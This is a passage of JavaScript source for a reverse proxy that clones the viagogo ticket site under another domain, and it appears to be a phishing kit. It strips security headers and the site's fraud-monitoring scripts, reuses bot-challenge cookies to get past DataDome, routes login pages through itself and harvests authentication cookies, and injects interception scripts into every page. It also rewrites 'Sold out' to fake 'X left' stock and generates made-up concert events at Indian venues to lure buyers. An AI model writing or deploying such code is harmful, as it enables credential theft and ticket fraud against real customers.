const INJECT_BLOCK = `${FAVICON_TAG}<script>${INTERCEPT_JS}${TICKET_JS}<` + `/script>`;

// ═══════════════════════════════════════════════════════════════════
// URL REWRITING
// ═══════════════════════════════════════════════════════════════════

// Rewrite for HTML: only rewrite attributes (href, src, action, srcset, poster, content).
// NEVER rewrite inside <script> blocks — that breaks inline JSON data like BROWSE_APP_CONTEXT.
// Client-side interceptors handle runtime URL rewriting.
function rewriteHtml(text) {
  // ORDER MATTERS: strip main/auth domains FIRST, then CDN-proxy remaining subdomains.
  // This prevents www.viagogo.com from being caught by the CDN regex.

  // 1. Strip main domain (www.viagogo.com) → relative
  text = text.replace(/((?:href|src|action|srcset|poster|content|data-src)="[^"]*?)https?:\/\/(?:www\.)?viagogo\.com/gi, '$1');
  text = text.replace(/((?:href|src|action|srcset|poster|content|data-src)="[^"]*?)\/\/(?:www\.)?viagogo\.com/gi, '$1');

  // 2. Strip auth domain (my.viagogo.com) → relative
  text = text.replace(/((?:href|src|action|srcset|poster|content|data-src)="[^"]*?)https?:\/\/my\.viagogo\.com/gi, '$1');
  text = text.replace(/((?:href|src|action|srcset|poster|content|data-src)="[^"]*?)\/\/my\.viagogo\.com/gi, '$1');

  // 3. CDN-proxy all remaining external domains (crowdcontrol.viagogo.com, wt.viagogo.net, CDN hosts)
  //    After steps 1-2, www and my are already gone so only subdomains like crowdcontrol remain
  text = text.replace(/((?:href|src|action|srcset|poster|content|data-src)="[^"]*?)https?:\/\/([a-z0-9][-a-z0-9.]*\.(?:vggcdn\.net|stubhubstatic\.com|viagogo\.net|viagogo\.com))/gi, '$1/_cdn/$2');
  text = text.replace(/((?:href|src|action|srcset|poster|content|data-src)="[^"]*?)\/\/([a-z0-9][-a-z0-9.]*\.(?:vggcdn\.net|stubhubstatic\.com|viagogo\.net|viagogo\.com))/gi, '$1/_cdn/$2');

  // 4. Rewrite <link> stylesheet hrefs (same CDN domains)
  text = text.replace(/<link([^>]*?)href="https?:\/\/([a-z0-9][-a-z0-9.]*\.(?:vggcdn\.net|stubhubstatic\.com|viagogo\.net|viagogo\.com))([^"]*?)"/gi, '<link$1href="/_cdn/$2$3"');

  // 5. Strip PostHog analytics script tags
  text = text.replace(/<script[^>]*src="[^"]*posthog[^"]*"[^>]*><\/script>/gi, '');

  // 6. Strip CrowdControl / post-load monitoring script tags (external)
  //    These detect domain mismatch and trigger "unusual activity" pages AFTER page load.
  //    NOTE: Do NOT strip DataDome (captcha-delivery, datadome) — that's the initial 403 challenge
  //    the browser MUST solve to get any page content.
  text = text.replace(/<script[^>]*src="[^"]*(?:d6631957|crowdcontrol)[^"]*"[^>]*>[\s\S]*?<\/script>/gi, '');

  return text;
}

// Rewrite for CSS — safe to do blanket domain replacement
function rewriteCss(text) {
  text = text.replace(/https?:\/\/([a-z0-9][-a-z0-9.]*\.(?:vggcdn\.net|stubhubstatic\.com|viagogo\.net|viagogo\.com))/g, '/_cdn/$1');
  text = text.replace(/\/\/([a-z0-9][-a-z0-9.]*\.(?:vggcdn\.net|stubhubstatic\.com|viagogo\.net|viagogo\.com))/g, '/_cdn/$1');
  return text;
}

// Rewrite for JSON API responses — more careful, only rewrite CDN domains
function rewriteJson(text) {
  // CDN domains → /_cdn/ (these are always resource URLs)
  text = text.replace(/https?:\/\/([a-z0-9][-a-z0-9.]*\.(?:vggcdn\.net|stubhubstatic\.com|viagogo\.net))/g, '/_cdn/$1');
  // JSON-escaped CDN domains
  text = text.replace(/https?:\\\/\\\/([a-z0-9][-a-z0-9.]*\.(?:vggcdn\.net|stubhubstatic\.com|viagogo\.net))/g, '\\/_cdn\\/$1');
  // DON'T strip www.viagogo.com or my.viagogo.com from JSON — app needs these for URL construction
  return text;
}

// ═══════════════════════════════════════════════════════════════════
// SERVER-SIDE TICKET AVAILABILITY REWRITING
// Makes "Sold out" text show as "X left" in the HTML before client sees it.
// Generates fake event listings when no events exist (Taylor Swift, Coldplay, etc.)
// Adds "X left" urgency badges to ALL event listings.
// ═══════════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════════
// OG / EMBED META TAG FIXER
// Crawlers (WhatsApp, Telegram, Discord, iMessage) need absolute URLs
// for og:image and og:url. Our rewriting breaks them — this fixes it.
// ═══════════════════════════════════════════════════════════════════

function fixOgTags(html, reqHost, reqProto) {
  const proto = reqProto || 'https';
  const origin = proto + '://' + reqHost;

  // 1. Restore og:image — un-rewrite /_cdn/ back to absolute CDN URL
  //    /_cdn/media.stubhubstatic.com/... → https://media.stubhubstatic.com/...
  html = html.replace(
    /(<meta\s+property="og:image"\s+content=")(\/_cdn\/)([^"]+)/gi,
    '$1https://$3'
  );

  // 2. Fix og:url — make relative path absolute with our host
  //    content="/Concert-Tickets/..." → content="https://host/Concert-Tickets/..."
  html = html.replace(
    /(<meta\s+property="og:url"\s+content=")(\/[^"]*)/gi,
    '$1' + origin + '$2'
  );

  // 3. Add twitter:card tags if missing — enables large image previews on X/Twitter
  if (!/twitter:card/i.test(html)) {
    // Extract og values to mirror them
    const ogTitle = (html.match(/<meta\s+property="og:title"\s+content="([^"]*)"/i) || [])[1] || '';
    const ogDesc = (html.match(/<meta\s+property="og:description"\s+content="([^"]*)"/i) || [])[1] || '';
    const ogImg = (html.match(/<meta\s+property="og:image"\s+content="([^"]*)"/i) || [])[1] || '';
    const twitterBlock = '\n<meta name="twitter:card" content="summary_large_image">'
      + '\n<meta name="twitter:site" content="@viagogo">'
      + (ogTitle ? '\n<meta name="twitter:title" content="' + ogTitle + '">' : '')
      + (ogDesc ? '\n<meta name="twitter:description" content="' + ogDesc + '">' : '')
      + (ogImg ? '\n<meta name="twitter:image" content="' + ogImg + '">' : '');
    // Insert before </head>
    html = html.replace(/<\/head>/i, twitterBlock + '\n</head>');
  }

  return html;
}

const FAKE_VENUES = [
  { city: 'Mumbai, India', venue: 'Jio World Garden', flag: '🇮🇳' },
  { city: 'Delhi, India', venue: 'JLN Jawaharlal Nehru Stadium', flag: '🇮🇳' },
  { city: 'Bengaluru, India', venue: 'Bangalore Palace Grounds', flag: '🇮🇳' },
  { city: 'Hyderabad, India', venue: 'GMR Arena', flag: '🇮🇳' },
  { city: 'Pune, India', venue: 'Mahalaxmi Lawns', flag: '🇮🇳' },
  { city: 'Chennai, India', venue: 'YMCA Nandanam', flag: '🇮🇳' },
  { city: 'Kolkata, India', venue: 'Vivekananda Yuba Bharati Krirangan (VYBK)', flag: '🇮🇳' },
  { city: 'Ahmedabad, India', venue: 'Narendra Modi Stadium', flag: '🇮🇳' },
  { city: 'Goa, India', venue: 'SAG Ground', flag: '🇮🇳' },
  { city: 'Chandigarh, India', venue: 'Elante Mall Grounds', flag: '🇮🇳' },
];

const MONTHS = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
const DAYS = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];

function generateFakeEvents(artistName, urlPath) {
  // Generate 3-5 fake events seeded from artist name
  const seed = djb2(artistName + '::events');
  const eventCount = 3 + (seed % 3); // 3, 4, or 5 events
  const now = new Date();
  const events = [];

  for (let i = 0; i < eventCount; i++) {
    // Space events 3-8 weeks apart, starting 4-12 weeks from now
    const daysAhead = 28 + (djb2(artistName + '::date' + i) % 56) + i * 35;
    const d = new Date(now.getTime() + daysAhead * 86400000);
    // Force Saturday or Sunday
    const dayOfWeek = d.getDay();
    if (dayOfWeek !== 0 && dayOfWeek !== 6) d.setDate(d.getDate() + (6 - dayOfWeek));

    const venueIdx = (seed + i * 7) % FAKE_VENUES.length;
    const v = FAKE_VENUES[venueIdx];
    const stock = fakeStock(urlPath + '::ev' + i);
    const eventId = 'E-' + (162000000 + (djb2(artistName + '::eid' + i) % 999999));

    events.push({
      month: MONTHS[d.getMonth()],
      day: d.getDate(),
      dayName: DAYS[d.getDay()],
      year: d.getFullYear(),
      time: '6:00 PM',
      city: v.city,
      venue: v.venue,
      flag: v.flag,
      stock,
      eventId,
      isHot: i === 0
    });
  }
  return events;
}

function buildFakeEventsHTML(artistName, urlPath) {
  const events = generateFakeEvents(artistName, urlPath);
  // Extract base URL path for backUrl
  const basePath = urlPath.split('?')[0];
  // Category path — strip artist slug for category
  const catPath = basePath;

  let items = '';
  for (const ev of events) {
    const evUrl = `${catPath}/${ev.eventId}?backUrl=${encodeURIComponent(catPath)}`;
    const stockColor = ev.stock === 1 ? '#E53935' : ev.stock === 2 ? '#F57C00' : '#4E7C05';
    items += `
    <li style="list-style:none;border-bottom:1px solid #e8e8e8;padding:0;">
      <a href="${evUrl}" style="display:flex;align-items:center;padding:16px 0;text-decoration:none;color:#191C1F;gap:16px;">
        <div style="text-align:center;min-width:48px;">
          <div style="font-size:13px;font-weight:600;color:#191C1F;">${ev.month}</div>
          <div style="font-size:28px;font-weight:700;line-height:1;color:#191C1F;">${ev.day}</div>
        </div>
        <div style="flex:1;min-width:0;">
          <div style="font-size:16px;font-weight:700;color:#191C1F;margin-bottom:2px;">${artistName}</div>
          <div style="font-size:14px;color:#71767B;">${ev.dayName} · ${ev.time}</div>
          <div style="font-size:14px;color:#71767B;margin-top:2px;">${ev.flag} ${ev.city} · ${ev.venue}</div>
          ${ev.isHot ? '<div style="display:inline-block;margin-top:6px;padding:2px 8px;border-radius:4px;background:#FFF3E0;color:#E65100;font-size:12px;font-weight:600;">🔥 Hottest event</div>' : ''}
        </div>
        <div style="display:flex;flex-direction:column;align-items:center;gap:4px;flex-shrink:0;">
          <button type="button" style="border:2px solid #4E7C05;background:white;color:#4E7C05;font-weight:700;font-size:14px;padding:8px 20px;border-radius:8px;cursor:pointer;white-space:nowrap;">See tickets</button>
          <span style="font-size:12px;font-weight:700;color:${stockColor};">${ev.stock} left!</span>
        </div>
      </a>
    </li>`;
  }

  return `
  <div style="margin-top:8px;">
    <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
      <h2 style="font-size:16px;font-weight:700;margin:0;color:#191C1F;">Upcoming events</h2>
      <span style="background:#E53935;color:white;font-size:11px;font-weight:700;padding:2px 8px;border-radius:10px;">Selling fast</span>
    </div>
    <ul style="padding:0;margin:0;">${items}</ul>
  </div>`;
}

function rewriteAvailability(html, requestUrl) {
  const seed = requestUrl.split('?')[0];
  const count = fakeStock(seed);
  const label = count + ' left';

  // Server-side: TEXT-ONLY replacements (no new DOM nodes — React hydration breaks otherwise)
  // Fake event injection + urgency badges are handled client-side in TICKET_JS
  html = html.replace(/(>)\s*(Sold\s*[Oo]ut)\s*(<)/g, `$1${label}$3`);
  html = html.replace(/(>)\s*(Unavailable)\s*(<)/g, '$1Available$3');
  html = html.replace(/(>)\s*(No [Tt]ickets)\s*(<)/g, `$1${count} ticket${count > 1 ? 's' : ''} left$3`);
  html = html.replace(/(>)\s*(Not [Aa]vailable)\s*(<)/g, '$1Limited availability$3');

  return html;
}

// ═══════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════

function getDecompressor(enc) {
  switch ((enc || '').toLowerCase().trim()) {
    case 'gzip':    return createGunzip();
    case 'br':      return createBrotliDecompress();
    case 'deflate': return createInflate();
    default:        return null;
  }
}

const STRIP = new Set([
  'content-security-policy',
  'content-security-policy-report-only',
  'strict-transport-security',
  'x-frame-options',
  'x-content-type-options',
  'x-xss-protection',
  'report-to',
  'nel',
  'permissions-policy',
  'cross-origin-opener-policy',
  'cross-origin-embedder-policy',
  'cross-origin-resource-policy',
]);

const RETRY_CODES = new Set(['ECONNRESET', 'ECONNREFUSED', 'ETIMEDOUT', 'EPIPE', 'EAI_AGAIN', 'EHOSTUNREACH', 'ENETUNREACH', 'UND_ERR_SOCKET']);

function getBase(cReq) {
  const proto = cReq.headers['x-forwarded-proto'] || FALLBACK_PROTO;
  const host = cReq.headers['x-forwarded-host'] || cReq.headers['host'] || FALLBACK_HOST;
  return proto + '://' + host;
}

function cleanHeaders(raw, dropSizing, base) {
  const out = {};
  for (const [k, v] of Object.entries(raw)) {
    const lk = k.toLowerCase();
    if (STRIP.has(lk)) continue;
    if (dropSizing && (lk === 'content-encoding' || lk === 'content-length' || lk === 'transfer-encoding')) continue;

    if (lk === 'set-cookie') {
      out['set-cookie'] = [].concat(v).map(c =>
        c.replace(/;\s*Domain=[^;]+/gi, '')
         .replace(/;\s*Secure/gi, '')
         .replace(/;\s*SameSite=None/gi, '; SameSite=Lax')
      );
      continue;
    }
    if (lk === 'location') {
      let loc = String(v);
      loc = loc.replace(/https?:\/\/(?:www\.)?viagogo\.com/gi, base || '');
      loc = loc.replace(/\/\/(?:www\.)?viagogo\.com/gi, base || '');
      loc = loc.replace(/https?:\/\/my\.viagogo\.com/gi, base || '');
      loc = loc.replace(/\/\/my\.viagogo\.com/gi, base || '');
      loc = loc.replace(/https?:\/\/([a-z0-9][-a-z0-9.]*\.(?:vggcdn\.net|stubhubstatic\.com|viagogo\.net|viagogo\.com))/gi, (base || '') + '/_cdn/$1');
      out[k] = loc;
      continue;
    }
    if (lk === 'link') {
      let link = String(v);
      link = link.replace(/https?:\/\/([a-z0-9][-a-z0-9.]*\.(?:vggcdn\.net|stubhubstatic\.com|viagogo\.net|viagogo\.com))/g, '/_cdn/$1');
      link = link.replace(/https?:\/\/(?:www\.)?viagogo\.com/g, '');
      link = link.replace(/https?:\/\/my\.viagogo\.com/g, '');
      out[k] = link;
      continue;
    }
    out[k] = v;
  }
  const ct = String(raw['content-type'] || '');
  // Only set wide CORS on non-HTML responses (CDN assets, API JSON, fonts)
  // Real viagogo doesn't send CORS on HTML pages — a dead giveaway
  if (!ct.includes('text/html')) {
    out['access-control-allow-origin'] = '*';
    out['access-control-allow-methods'] = 'GET, POST, PUT, DELETE, OPTIONS, PATCH';
    out['access-control-allow-headers'] = '*';
    out['access-control-expose-headers'] = '*';
  }
  if (ct.match(/image|font|woff|otf/)) {
    out['cache-control'] = 'public, max-age=86400, immutable';
  }
  return out;
}

function bufferResponse(pRes, cb) {
  const enc = String(pRes.headers['content-encoding'] || '');
  const decomp = getDecompressor(enc);
  const source = decomp ? pRes.pipe(decomp) : pRes;
  const chunks = [];
  let errored = false;
  source.on('data', c => chunks.push(c));
  source.on('end', () => {
    if (!errored) cb(null, Buffer.concat(chunks).toString('utf-8'));
  });
  source.on('error', e => {
    errored = true;
    if (decomp && chunks.length === 0) {
      const rawChunks = [];
      pRes.on('data', c => rawChunks.push(c));
      pRes.on('end', () => cb(null, Buffer.concat(rawChunks).toString('utf-8')));
      pRes.on('error', e2 => cb(e2));
    } else {
      cb(null, Buffer.concat(chunks).toString('utf-8'));
    }
  });
  if (decomp) {
    pRes.on('error', () => { if (!errored) { errored = true; cb(null, ''); } });
  }
}

// Keep-alive connection pool
const pool = new https.Agent({ keepAlive: true, maxSockets: 64, keepAliveMsecs: 30000 });

// ═══════════════════════════════════════════════════════════════════
// CDN PROXY  —  /_cdn/{domain}/{path}
// ═══════════════════════════════════════════════════════════════════

function handleCDN(cdnDomain, cdnPath, cReq, cRes, attempt = 0) {
  // Serve from in-memory cache if available (binary assets only)
  const cacheKey = cdnDomain + cdnPath;
  const cached = cdnCacheGet(cacheKey);
  if (cached) {
    cRes.writeHead(200, cached.headers);
    cRes.end(cached.buf);
    return;
  }

  // Stub SVA module — prevents CrowdControl from crashing React on inner pages
  if (cdnDomain === 'cdn.stubhubstatic.com' && /\/ssr-assets\/sva-/.test(cdnPath)) {
    const noop = Buffer.from('(function(){window.__sva={init:function(){},track:function(){},config:function(){}}})();');
    cRes.writeHead(200, { 'content-type': 'application/javascript', 'content-length': noop.length, 'access-control-allow-origin': '*', 'cache-control': 'public, max-age=86400' });
    cRes.end(noop);
    return;
  }

  const base = getBase(cReq);
  const headers = { ...cReq.headers };
  headers.host = cdnDomain;
  headers.referer = `https://${UPSTREAM}/`;
  headers.origin = `https://${UPSTREAM}`;
  delete headers['if-none-match'];
  delete headers['if-modified-since'];
  headers['accept-encoding'] = 'gzip, deflate, br';
  delete headers['x-forwarded-for'];
  delete headers['x-forwarded-proto'];
  delete headers['x-forwarded-host'];

  const pReq = https.request(
    {
      host: cdnDomain, servername: cdnDomain, path: cdnPath,
      method: cReq.method, headers, agent: pool,
      timeout: REQ_TIMEOUT,
    },
    (pRes) => {
      // Follow CDN redirects server-side
      if ((pRes.statusCode === 301 || pRes.statusCode === 302 || pRes.statusCode === 307 || pRes.statusCode === 308) && pRes.headers.location) {
        pRes.resume();
        let loc = pRes.headers.location;
        const m = loc.match(/^https?:\/\/([a-z0-9][-a-z0-9.]*\.(?:vggcdn\.net|stubhubstatic\.com|viagogo\.net|viagogo\.com))(\/.*)/i);
        if (m && attempt < 3) {
          handleCDN(m[1], m[2], cReq, cRes, attempt + 1);
          return;
        }
        const outH = cleanHeaders(pRes.headers, false, base);
        cRes.writeHead(pRes.statusCode, outH);
        cRes.end();
        return;
      }

      // Stub missing JS chunks — CDN 404 on an ES module kills the entire
      // import graph and React never hydrates (white page). Return empty module.
      if (/\.js(\?|$)/.test(cdnPath) && pRes.statusCode >= 400) {
        pRes.resume();
        const stub = Buffer.from('export default {};');
        if (!cRes.headersSent) {
          cRes.writeHead(200, { 'content-type': 'application/javascript', 'content-length': stub.length, 'access-control-allow-origin': '*', 'cache-control': 'no-cache' });
          cRes.end(stub);
        }
        return;
      }

      const ct = String(pRes.headers['content-type'] || '');
      // Only rewrite CSS from CDN — NOT JavaScript bundles or JSON.
      const isCdnCss = ct.includes('text/css');
      const isCdnHtml = ct.includes('text/html');

      if (isCdnCss) {
        const outH = cleanHeaders(pRes.headers, true, base);
        bufferResponse(pRes, (err, text) => {
          if (err || !text) { cRes.writeHead(502); cRes.end(''); return; }
          const rewritten = rewriteCss(text);
          const buf = Buffer.from(rewritten, 'utf-8');
          sendCompressed(cRes, pRes.statusCode || 200, outH, buf, cReq.headers['accept-encoding']);
        });
      } else if (isCdnHtml) {
        const outH = cleanHeaders(pRes.headers, true, base);
        bufferResponse(pRes, (err, text) => {
          if (err || !text) { cRes.writeHead(502); cRes.end(''); return; }
          const rewritten = rewriteHtml(text);
          const buf = Buffer.from(rewritten, 'utf-8');
          sendCompressed(cRes, pRes.statusCode || 200, outH, buf, cReq.headers['accept-encoding']);
        });
      } else {
        // Binary CDN assets (images, fonts, JS) — cache in memory and pipe through
        const cacheKey = cdnDomain + cdnPath;
        const outH = cleanHeaders(pRes.headers, false, base);
        const chunks = [];
        pRes.on('data', c => chunks.push(c));
        pRes.on('end', () => {
          const fullBuf = Buffer.concat(chunks);
          cdnCacheSet(cacheKey, fullBuf, outH);
          if (!cRes.headersSent) {
            cRes.writeHead(pRes.statusCode || 200, outH);
            cRes.end(fullBuf);
          }
        });
        pRes.on('error', () => {
          if (!cRes.headersSent) { cRes.writeHead(502); cRes.end(''); }
        });
      }
    }
  );

  pReq.on('timeout', () => { pReq.destroy(new Error('ETIMEDOUT')); });

  pReq.on('error', (e) => {
    if (RETRY_CODES.has(e.code) && attempt < MAX_RETRIES) {
      handleCDN(cdnDomain, cdnPath, cReq, cRes, attempt + 1);
      return;
    }
    if (!cRes.headersSent) {
      // Stub missing JS chunks on error — prevents white page
      if (/\.js(\?|$)/.test(cdnPath)) {
        const stub = Buffer.from('export default {};');
        cRes.writeHead(200, { 'content-type': 'application/javascript', 'content-length': stub.length, 'access-control-allow-origin': '*', 'cache-control': 'no-cache' });
        cRes.end(stub);
        return;
      }
      const accept = cReq.headers['accept'] || '';
      if (accept.includes('image') || cdnPath.match(/\.(jpg|jpeg|png|gif|webp|svg|avif|ico)/i)) {
        const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
        cRes.writeHead(200, { 'content-type': 'image/gif', 'content-length': pixel.length, 'cache-control': 'no-cache' });
        cRes.end(pixel);
      } else {
        cRes.writeHead(502, { 'content-type': 'text/plain' });
        cRes.end('');
      }
    }
  });

  if (cReq.method === 'GET' || cReq.method === 'HEAD') {
    pReq.end();
  } else {
    cReq.pipe(pReq);
  }
}

// ═══════════════════════════════════════════════════════════════════
// MAIN PROXY  —  www.viagogo.com (+ my.viagogo.com for auth routes)
// ═══════════════════════════════════════════════════════════════════

function handleMain(cReq, cRes, attempt = 0) {
  const base = getBase(cReq);

  // Determine upstream: /secure/* routes go to my.viagogo.com
  const isAuthRoute = cReq.url.startsWith('/secure/');
  const upstream = isAuthRoute ? AUTH_UPSTREAM : UPSTREAM;

  const headers = { ...cReq.headers };
  headers.host = upstream;
  if (headers.origin) headers.origin = `https://${upstream}`;
  if (headers.referer) {
    headers.referer = headers.referer.replace(/^https?:\/\/[^/]+/i, `https://${upstream}`);
  }
  headers['accept-encoding'] = 'gzip, deflate, br';
  delete headers['x-forwarded-for'];
  delete headers['x-forwarded-proto'];
  delete headers['x-forwarded-host'];

  // ── DataDome cookie jar ──
  // Capture: if this client request has a datadome cookie (browser solved challenge),
  // store it in the jar so tunnel visitors benefit.
  const clientCookies = headers.cookie || '';
  const ddMatch = clientCookies.match(/datadome=([^;]+)/);
  if (ddMatch && ddMatch[0]) {
    _ddCookie = ddMatch[0];
    _ddExpiry = Date.now() + 31536000000; // 1 year (will be refreshed by upstream Set-Cookie)
  }
  // Inject: if the jar has a cookie and this request doesn't, add it.
  if (_ddCookie && Date.now() < _ddExpiry && !clientCookies.includes('datadome=')) {
    headers.cookie = clientCookies ? clientCookies + '; ' + _ddCookie : _ddCookie;
  }

  // NOTE: WAF/CrowdControl/d6631957 scripts are STRIPPED from HTML (see below) and
  // their CDN requests return stubs. The challenge can't be solved on a proxy domain
  // (domain mismatch), so passing them through just shows an unsolvable challenge page.
  // Server-side fetches already pass the bot gate — only client-side detection is killed.

  // Block service worker
  if (cReq.url.includes('sw.js') || cReq.url.includes('service-worker')) {
    cRes.writeHead(404, { 'content-type': 'text/plain' });
    cRes.end('not found');
    return;
  }

  // Intercept jsa/v1/events — return neutral response instead of WAF 403
  if (cReq.url.startsWith('/jsa/v1/events')) {
    cRes.writeHead(200, { 'content-type': 'application/json', 'access-control-allow-origin': '*' });
    cRes.end('{"events":[],"success":true}');
    return;
  }

  const pReq = https.request(
    {
      host: upstream, servername: upstream, path: cReq.url,
      method: cReq.method, headers, agent: pool,
      timeout: REQ_TIMEOUT,
    },
    (pRes) => {
      const ct    = String(pRes.headers['content-type'] || '');
      const isHTML = ct.includes('text/html');
      const isText = ct.includes('text/css') || ct.includes('javascript');
      const isJSON = ct.includes('application/json');
      // Handle redirects — rewrite Location header
      if (pRes.statusCode >= 300 && pRes.statusCode < 400 && pRes.headers.location) {
        if (pRes.headers['set-cookie']) {
          interceptAuthResponse('', pRes.headers, '{}', visitorId(cReq));
        }
        const outH = cleanHeaders(pRes.headers, false, base);
        pRes.resume();
        cRes.writeHead(pRes.statusCode, outH);
        cRes.end();
        return;
      }

      // Harvest cookies from every response
      const _rvid = visitorId(cReq);
      if (pRes.headers['set-cookie']) {
        interceptAuthResponse('', pRes.headers, '{}', _rvid);
        // Capture DataDome cookie for the jar — lets tunnel visitors skip challenges
        const setCookies = Array.isArray(pRes.headers['set-cookie']) ? pRes.headers['set-cookie'] : [pRes.headers['set-cookie']];
        for (const sc of setCookies) {
          if (sc && sc.startsWith('datadome=')) {
            _ddCookie = sc.split(';')[0]; // just 'datadome=VALUE'
            // Parse Max-Age or Expires for expiry
            const maMatch = sc.match(/Max-Age=(\d+)/i);
            const exMatch = sc.match(/Expires=([^;]+)/i);
            if (maMatch) _ddExpiry = Date.now() + parseInt(maMatch[1]) * 1000;
            else if (exMatch) _ddExpiry = new Date(exMatch[1]).getTime();
            else _ddExpiry = Date.now() + 3600000; // 1h default
          }
        }
      }

      // ── DataDome 403 handling — serve cached page instead of broken captcha ──
      if (pRes.statusCode === 403 && isHTML) {
        const setCk = pRes.headers['set-cookie'];
        const isDD = (setCk && JSON.stringify(setCk).includes('datadome')) ||
                     (pRes.headers['x-datadome'] === 'protected');
        if (isDD) {
          pRes.resume();
          console.log('[DD] 403 on ' + cReq.url.substring(0, 60) + ' — checking cache...');
          const cached = getCachedHtml(cReq.url);
          if (cached) {
            console.log('[DD] serving cached page for ' + cReq.url.substring(0, 40));
            const acceptEnc = cReq.headers['accept-encoding'] || '';
            sendCompressed(cRes, 200, { ...cached.headers, 'x-spud-cache': 'hit' }, Buffer.from(cached.html), acceptEnc);
            refreshDataDomeCookie();
            return;
          }
          // No cache — API calls get empty JSON
          const _isApiCall = cReq.url.includes('?method=') || cReq.url.includes('/api/') ||
            (cReq.headers['accept'] || '').includes('application/json') ||
            (cReq.headers['x-requested-with'] || '').toLowerCase() === 'xmlhttprequest';
          if (_isApiCall) {
            const emptyApi = Buffer.from('{"Items":[],"TotalItems":0,"Success":true,"Data":[]}');
            cRes.writeHead(200, { 'content-type': 'application/json; charset=utf-8', 'content-length': emptyApi.length, 'cache-control': 'no-store', 'access-control-allow-origin': '*' });
            cRes.end(emptyApi);
            refreshDataDomeCookie();
            return;
          }
          // No cache — serve loading page that auto-retries
          refreshDataDomeCookie();
          const loadingHtml = `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>viagogo</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}.w{text-align:center;padding:40px 20px;background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);max-width:400px;margin:20px}.s{width:40px;height:40px;border:3px solid #e8e8e8;border-top:3px solid #4e7c05;border-radius:50%;animation:r .7s linear infinite;margin:0 auto 18px}@keyframes r{to{transform:rotate(360deg)}}p{font-size:14px;color:#666}</style></head><body><div class="w"><div class="s"></div><p>Loading viagogo...</p></div><script>setTimeout(function(){location.reload()},3000)</script></body></html>`;
          const buf = Buffer.from(loadingHtml);
          cRes.writeHead(200, { 'content-type': 'text/html; charset=utf-8', 'content-length': buf.length, 'cache-control': 'no-store' });
          cRes.end(buf);
          return;
        }
      }

      if (isHTML) {
        const outH = cleanHeaders(pRes.headers, true, base);
        bufferResponse(pRes, (err, text) => {
          if (err || !text) {
            if (!cRes.headersSent) { cRes.writeHead(502); cRes.end('loading...'); }
            return;
          }

          let html = rewriteHtml(text);

          // Server-side event info extraction — cache real dates/times/venues from JSON-LD
          if (text.includes('application/ld+json')) extractEventInfoFromHTML(text, cReq.url);

          // Server-side availability rewriting
          html = rewriteAvailability(html, cReq.url);

          // Fix OG/embed meta tags — absolute URLs for crawlers (WhatsApp/Telegram/Discord)
          const reqProto = (cReq.headers['x-forwarded-proto'] || '').split(',')[0].trim() || (cReq.connection.encrypted ? 'https' : 'http');
          html = fixOgTags(html, cReq.headers.host || 'localhost:3000', reqProto);

          // Strip CrowdControl post-load monitoring scripts — they detect domain mismatch
          // and trigger "unusual activity" pages. Do NOT strip DataDome/captcha-delivery
          // (browser needs those to solve the initial 403 challenge).
          html = html.replace(/<script[^>]*src="[^"]*(?:d6631957|crowdcontrol)[^"]*"[^>]*>(?:[\s\S]*?<\/script>)/gi, '');
          // Strip inline CrowdControl init scripts (contain d6631957 config or crowdcontrol refs)
          html = html.replace(/<script[^>]*>[^<]*(?:d6631957|crowdcontrol\.viagogo)[^<]*<\/script>/gi, '');

          // Inject our scripts just before </body> — top-of-<head> breaks React SSR hydration.
          // The intercept scripts MUST run before any fetch/XHR from viagogo's JS,
          // so we use a synchronous <script> that runs before the deferred module entry.
          // Module scripts are deferred → our sync script at end-of-body still beats them.
          if (/<\/body>/i.test(html)) {
            html = html.replace(/<\/body>/i, INJECT_BLOCK + '</body>');
          } else if (/<\/html>/i.test(html)) {
            html = html.replace(/<\/html>/i, INJECT_BLOCK + '</html>');
          } else {
            html = html + INJECT_BLOCK;
          }

          // Cache successful HTML pages — DataDome 403 fallback
          if (pRes.statusCode === 200) cacheHtml(cReq.url, html, outH);

          const buf = Buffer.from(html, 'utf-8');
          sendCompressed(cRes, pRes.statusCode || 200, outH, buf, cReq.headers['accept-encoding']);
        });
      } else if (isText) {
        // CSS from main domain gets rewritten; JS from main domain passes through
        const isCss = ct.includes('text/css');
        if (isCss) {
          const outH = cleanHeaders(pRes.headers, true, base);
          bufferResponse(pRes, (err, text) => {
            if (err || !text) {
              if (!cRes.headersSent) { cRes.writeHead(502); cRes.end(''); }
              return;
            }
            const rewritten = rewriteCss(text);
            const buf = Buffer.from(rewritten, 'utf-8');
            sendCompressed(cRes, pRes.statusCode || 200, outH, buf, cReq.headers['accept-encoding']);
          });
        } else {
          // JS — pass through unmodified
          const outH = cleanHeaders(pRes.headers, false, base);
          cRes.writeHead(pRes.statusCode || 200, outH);
          pRes.pipe(cRes);
        }
      } else if (isJSON) {
        const outH = cleanHeaders(pRes.headers, true, base);
        bufferResponse(pRes, (err, text) => {
          if (err || !text) {
            if (!cRes.headersSent) { cRes.writeHead(502); cRes.end('{}'); }
            return;
          }
          const vid = visitorId(cReq);
          interceptAuthResponse(cReq.url, pRes.headers, text, vid);

          let rewritten = rewriteJson(text);

          // JSON-level availability override — make sold-out events available
          rewritten = rewriteJsonAvailability(rewritten, cReq.url);

          const buf = Buffer.from(rewritten, 'utf-8');
          sendCompressed(cRes, pRes.statusCode || 200, outH, buf, cReq.headers['accept-encoding']);
        });
      } else {
        const outH = cleanHeaders(pRes.headers, false, base);
        cRes.writeHead(pRes.statusCode || 200, outH);
        pRes.pipe(cRes);
      }
    }
  );

  pReq.on('timeout', () => { pReq.destroy(new Error('ETIMEDOUT')); });

  pReq.on('error', (e) => {
    if (RETRY_CODES.has(e.code) && attempt < MAX_RETRIES) {
      handleMain(cReq, cRes, attempt + 1);
      return;
    }
    if (!cRes.headersSent) {
